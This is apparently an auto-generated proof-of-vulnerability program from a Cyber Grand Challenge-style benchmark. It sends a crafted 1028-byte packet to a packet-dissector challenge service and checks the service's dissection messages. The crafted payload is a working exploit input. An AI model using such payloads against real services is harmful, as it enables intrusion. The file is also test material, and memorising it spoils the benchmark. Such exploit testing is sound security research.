#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x2c\xff\x6e\xa2"
         "\xa5\x27\x15\x6e\xdc\xff\xd2\x30\x0a\x01\x00\x00\x4a\xe6\x49\xc2"
         "\x67\x78\x48\xf5\x27\xca\xfd\x40\x8a\x9d\x94\xa6\x42\x8c\xfd\x98"
         "\x3d\x61\xd2\xf9\x42\x79\x3e\x9e\x80\xf9\x9f\xa9\xc7\x0e\xc0\x7e"
         "\x5c\xde\xc0\x0e\x34\xec\x36\x92\x57\x82\x9c\xb7\xe7\x00\xb0\xe0"
         "\x36\x4a\xf3\x84\xbc\xbc\x9d\xd4\x04\x25\xeb\x04\x4e\xf0\xf1\x18"
         "\xec\xba\xe9\x95\x02\xa6\x0e\x46\xef\x26\xdf\x67\x2a\xef\x48\x79"
         "\x27\x41\xfc\x6e\x5f\xdc\xfb\xd0\x66\x85\x9c\xe1\x14\x9a\x5a\xa1"
         "\xd0\x5a\x41\x65\x0a\x74\x48\xb6\x6d\x7b\x96\x0e\x00\x64\x14\xd6"
         "\x7d\x9a\x6c\x82\x8b\x82\xd9\x54\x6b\x2a\xd7\x1a\x14\x0e\x7b\xb7"
         "\x7f\x70\x15\xa0\xd2\x7f\x2f\xc0\xed\x7a\x69\x13\x41\xb6\x0f\xea"
         "\x09\xc2\x77\x12\x4d\xc5\xb9\x6b\x1e\x13\xa9\xe1\xe4\x51\xbf\x7a"
         "\x01\xfc\x99\x15\xdb\x94\x46\xdf\x84\x0b\x6c\xa4\x70\xb4\x8d\xd3"
         "\x4d\x65\xb9\x5f\x61\x33\x8d\xd8\x95\x93\x67\xeb\x9d\x4d\xed\x16"
         "\xf5\x68\xe1\xa3\x40\xf2\x86\x1e\x88\x90\xe3\xce\x6c\x0c\xc4\xdb"
         "\xf8\x12\x63\xe0\x6e\xf2\x1f\xe0\x2d\x7e\x34\x4e\xa5\x0d\xa0\x48"
         "\x9c\x1c\x3b\xf8\x7d\xcc\x1d\xed\x6d\xdd\x99\x68\x8b\xbb\xd4\x67"
         "\x81\x82\x09\x55\xa0\xda\xc2\xef\x2f\x25\xb1\x07\xaf\x46\x82\xf3"
         "\xb3\x54\xd5\xd9\xca\x2b\x93\x7b\x81\xa3\x92\xa4\x8f\x3f\xd8\xb8"
         "\xf2\x13\xdd\x30\xae\xed\x6b\xf2\xb4\xd2\xf1\x54\x46\xf2\x4c\xda"
         "\xf7\xb1\xdb\xdd\x11\x97\xd9\x82\x14\x50\xe0\x7c\xc3\xed\x0b\x4c"
         "\xd0\xab\x2b\x74\x59\x37\x23\x25\x09\x67\x17\xcf\xa9\x9e\x92\x94"
         "\x77\xf4\x17\x06\x23\x93\x7c\x65\x1f\x82\xaa\x35\x9e\x62\x5b\x11"
         "\xd1\xc5\x6c\x38\xf0\x14\xd4\x89\xe3\xc6\x5b\xe2\xf5\x50\x8c\xf8"
         "\xac\xc0\xbb\x84\x75\x20\x42\x0e\x77\xf4\x4f\x96\xb1\xe6\x2a\xc8"
         "\xfe\x4a\xe0\xca\x45\xd9\x5d\x21\xc1\x99\x32\xe8\xdf\x9f\x39\x37"
         "\xda\x56\xa7\x5d\xd0\xcd\x45\x9d\xf0\x48\x4b\x37\x2a\x4d\xe9\xa2"
         "\x2a\xc8\xcb\x84\x6c\x48\x35\x56\x6b\x62\xf8\x98\xa7\x18\x40\xbf"
         "\x12\x27\xbf\xd5\xde\xdf\x84\x0f\xca\xa2\xf0\x08\x00\xa1\xcb\x10"
         "\xe5\x5d\x0e\x04\x2e\x4d\x1b\x5c\x54\xbb\xdd\x94\xd1\x79\x58\x82"
         "\xbd\xa9\xb2\x0c\x37\xaa\xde\x29\x59\xe9\xca\x9e\xd3\xcb\x9f\x1d"
         "\xda\x1c\x33\xfd\x01\x41\xc9\x3a\xe9\xcf\xb8\x16\xd3\x7b\x62\xaa"
         "\x5b\xae\x70\xc1\x82\x70\x30\x92\x88\x94\x88\x89\x1b\xe2\xe2\x7c"
         "\x0c\x7c\x07\x0e\xc3\x60\x1a\x3f\xb7\xed\xcf\xbb\x75\x5d\xc3\xd4"
         "\xd0\xc3\x2f\x76\x07\x44\x42\x3a\x33\x5b\x4d\xfa\x80\x8f\xda\xce"
         "\x83\x3f\xfc\x05\x50\x2f\x88\x78\xe6\x33\xbb\xf4\xfb\x50\xed\xd8"
         "\x24\xce\x28\x29\x8d\x40\x47\xf8\x4a\x93\x35\x62\x58\x11\x6c\x6b"
         "\x26\xf7\x41\xd1\x51\x36\x20\x0e\x07\xff\x37\xe9\x67\x25\x2f\xf8"
         "\xea\xf2\x98\xab\xe3\x80\xd1\x70\x83\x68\x75\x0b\x4d\x7b\xa6\xcb"
         "\x70\xf5\x37\xae\x41\x87\x9a\x7c\x0e\x00\x36\x47\x79\xea\x5a\x29"
         "\xd0\x6f\x94\xfe\x2a\x4f\xbc\x74\x96\xe7\x84\xa1\x23\xce\x65\x98"
         "\x50\xf5\xa0\x23\x70\x57\x92\x5c\x4c\x4b\xd2\x73\x76\x92\x65\xde"
         "\x98\x11\xef\x63\xf0\x15\x0e\x33\x04\xea\x53\xb6\xe1\x6e\xa0\x78"
         "\x5a\x28\x1f\x72\x13\x1f\xf2\x4a\xc0\xb2\x83\xf8\xf2\x04\x03\x45"
         "\x4e\xe3\x78\x89\x48\x14\x51\x10\x02\xe1\x7d\x82\x39\x9d\x65\x5d"
         "\x07\x77\x39\xe4\xac\x82\x96\x7c\xc1\x60\x72\xac\xb5\x1e\x15\x30"
         "\xde\x77\xb1\x85\x5e\xfd\xbe\x71\xc4\x73\xe0\x25\x78\xcc\x19\x59"
         "\x62\x83\xf1\x51\xcf\x33\x17\x18\x91\x72\xfb\xac\x41\x39\xe6\x44"
         "\xc3\x74\xe9\x9e\xd5\xd2\x95\xdc\xe3\x24\x30\x24\xa7\x11\x00\x94"
         "\xd8\x46\xcd\x83\x0a\x94\xae\xbd\x62\xa7\x7f\x33\x88\x8a\xe1\x48"
         "\xc7\x0c\x12\x8c\x83\x1f\x52\x75\x10\x3b\x44\xee\x04\x56\x7e\x90"
         "\x1a\xc0\xcd\x91\xab\x97\xd2\xb7\xbb\xe4\x58\xcd\x0e\x00\x2d\xd5"
         "\xca\xdf\x53\x50\x4f\x44\x92\x99\xdc\x50\x45\xfe\x3e\x49\x26\xae"
         "\x0b\x94\xf2\x7b\x32\xf5\x4b\x55\xf2\x7e\xfb\x45\xa0\x22\xf7\xcf"
         "\x8a\xa7\xd0\x3d\x80\x4c\x62\x60\xd1\xb7\x1b\x9a\x7f\xe1\xe0\x29"
         "\x87\x92\x95\x04\x78\xcc\x8f\x42\x64\x16\x79\x5f\xff\x5a\xc4\x68"
         "\x36\x64\x52\x3c\x37\x60\xcb\xf8\x51\x25\x8f\x30\x35\xf8\xce\xf2"
         "\x24\xde\xc7\xa2\x64\x8f\x52\x65\xec\x8c\xd3\xbe\x0d\xc8\x2a\x21"
         "\xff\x09\x39\xac\x4f\xb6\xc4\x54\xf2\x9e\xeb\xdc\xd2\x31\x42\x21"
         "\x3e\xc9\x7e\xed\x14\x19\xb2\x67\x57\xb4\x57\xac\x6e\x1e\x0d\x79"
         "\x50\x9a\x7e\x22\xc0\x47\x20\x83\xaa\x2f\x69\xa8\xdc\x9e\xc7\x8a"
         "\xe7\xba\x15\x5b\xaf\xfc\x11\x4f\x89\xda\x23\x32\xd5\x0f\x2f\xc5"
         "\xb6\xbf\x53\xb9\x53\x26\x95\xa5\xa8\x82\x9f\x4f\x98\x11\x60\x58"
         "\x8e\xbd\x0a\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===archsnoblodgepole
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x61\x72\x63\x68\x73\x6e\x6f\x62\x6c\x6f\x64"
         "\x67\x65\x70\x6f\x6c\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
